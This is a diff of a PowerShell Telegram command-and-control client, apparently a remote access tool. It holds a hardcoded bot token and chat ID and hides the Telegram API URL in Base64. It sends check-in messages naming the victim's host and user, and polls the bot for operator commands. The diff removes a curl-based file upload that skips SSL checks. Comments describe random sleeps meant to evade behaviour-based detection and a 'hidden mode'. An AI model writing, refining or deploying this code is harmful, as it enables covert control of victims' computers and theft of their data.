@@ -1,5 +1,3 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
 # ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define Connection Variables
 # $Token = "8773971348:AAH1rt2BDljZzyRZqdFCp5qv1BR3JDNBD78"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
@@ -926,40 +924,36 @@ $Path = "$env:Temp\ffmpeg.exe"
     }
 }
 
-# 1. Configuration (Obfuscated)
+# 1. Force TLS 1.2 for Windows 11 (CRITICAL for Hidden Mode)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# 2. Configuration
 $ChatID = "1370052445"
-# This is 'https://api.telegram.org/bot' hidden in Base64
 $b64 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
 $p_prefix = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
 $t_base = $p_prefix + $Token + "/"
 
-# 2. Posting Functions
+# 3. Posting Functions
 Function Post-Message {
     param($text)
     $u = $t_base + "sendMessage"
     $p = @{chat_id = $ChatID ; text = $text}
-    try { [void](Invoke-RestMethod -Uri $u -Method POST -Body $p -UseBasicParsing -TimeoutSec 5) } catch {}
+    # -UseBasicParsing prevents background IE engine hangs
+    try { [void](Invoke-RestMethod -Uri $u -Method POST -Body $p -UseBasicParsing -TimeoutSec 10) } catch {}
 }
 
-Function Post-File {
-    $u = $t_base + "sendDocument"
-    # -k allows connection even if the target has SSL inspection
-    curl.exe -s -k -F chat_id="$ChatID" -F document=@"$filePath" "$u" | Out-Null
-}
-
-# 3. The Main Loop
 Function ShowButtons {
-    # Check-in happens immediately using the hardcoded ChatID
-    Post-Message "[+] Agent Active: $env:COMPUTERNAME ($env:USERNAME)"
+    # This will be your first confirmation that the script is NOT hanging
+    Post-Message "[!] Script Initialized on $env:COMPUTERNAME"
 
-    $mHead = "C2 Online. Waiting for interaction..."
-    $kb = '{"inline_keyboard":[[{"text": "Execute Commands","callback_data": "button_clicked"},{"text": "Settings","callback_data": "button2_clicked"}]]}'
+    $mHead = "C2 Operational. Waiting for command..."
+    $kb = '{"inline_keyboard":[[{"text": "Execute","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
     
     $u = $t_base + "sendMessage"
     $params = @{chat_id = $ChatID ; text = $mHead ; reply_markup = $kb}
     
     try {
-        [void](Invoke-RestMethod -Uri $u -Method POST -ContentType "application/json" -Body ($params | ConvertTo-Json -Depth 10) -UseBasicParsing)
+        [void](Invoke-RestMethod -Uri $u -Method POST -ContentType "application/json" -Body ($params | ConvertTo-Json) -UseBasicParsing)
     } catch {}
 
     $killint = 0
@@ -968,12 +962,12 @@ Function ShowButtons {
 
     while ($killint -eq 0) {
         try {
-            $updates = Invoke-RestMethod -Uri ($uUrl + $offset) -Method Get -UseBasicParsing -TimeoutSec 10
+            # Long-polling helps keep the connection alive in the background
+            $updates = Invoke-RestMethod -Uri ($uUrl + $offset) -Method Get -UseBasicParsing -TimeoutSec 20
             
             foreach ($update in $updates.result) {
                 $offset = $update.update_id + 1
                 
-                # Check for text or buttons
                 if ($update.message.text -ilike "*start*") { $killint = 1 }
                 if ($update.callback_query.data -eq "button_clicked") { $killint = 1 }
                 
@@ -983,13 +977,13 @@ Function ShowButtons {
                 }
             }
         } catch {
-            Start-Sleep -Seconds 5
+            # If the network fails, wait 10s and retry silently
+            Start-Sleep -Seconds 10
         }
-        # Random sleep interval to bypass behavior-based detection
         Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
     }
 
-    Post-Message "[*] Session Transitioning..."
+    Post-Message "[*] Session Active."
 }
 
 # Session Authentication
